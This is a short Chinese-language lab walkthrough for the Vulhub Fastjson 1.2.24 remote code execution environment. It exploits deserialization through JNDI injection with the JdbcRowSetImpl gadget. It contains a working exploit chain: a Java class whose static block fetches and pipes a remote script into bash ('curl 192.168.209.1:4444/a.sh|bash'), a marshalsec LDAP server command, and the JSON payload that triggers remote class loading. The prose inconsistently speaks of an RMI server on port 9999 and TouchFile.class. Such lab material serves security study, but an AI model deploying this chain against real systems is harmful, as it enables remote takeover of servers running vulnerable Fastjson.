# vulhb-fastjson-1.2.24-rce

## 考点

- Fastjson反序列化

## WalkThrough

因为目标环境是Java 8u102，没有`com.sun.jndi.rmi.object.trustURLCodebase`的限制，我们可以使用`com.sun.rowset.JdbcRowSetImpl`的利用链，借助JNDI注入来执行命令。

[c0ny1/FastjsonExploit: Fastjson vulnerability quickly exploits the framework（fastjson漏洞快速利用框架） (github.com)](https://github.com/c0ny1/FastjsonExploit)

> LDAP远程类加载仅使用与Java 8u191

首先编译并上传命令执行代码，如`http://evil.com/EvilClass.class`：

```java
// javac EvilClass.java

public class EvilClass {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"bash","-c","curl 192.168.209.1:4444/a.sh|bash"});
        } catch (Exception e) {
            // 忽略错误，在生成生成序列化代码时也会执行static部分，必然报错，直接跳过即可
        }
    }
}
```

然后我们借助[marshalsec](https://github.com/mbechler/marshalsec)项目，启动一个RMI服务器，监听9999端口，并制定加载远程类`TouchFile.class`：

```shell
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.209.1:4444/#EvilClass 1389
```

向靶场服务器发送Payload，带上LDAP的地址：

```json
{
    "b":{
        "a":{
            "@type":"java.lang.Class",
            "val":"com.sun.rowset.JdbcRowSetImpl"
        },
        "b":{
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"ldap://192.168.209.1:1389/EvilClass",
            "autoCommit":true
        }
    }
}
```
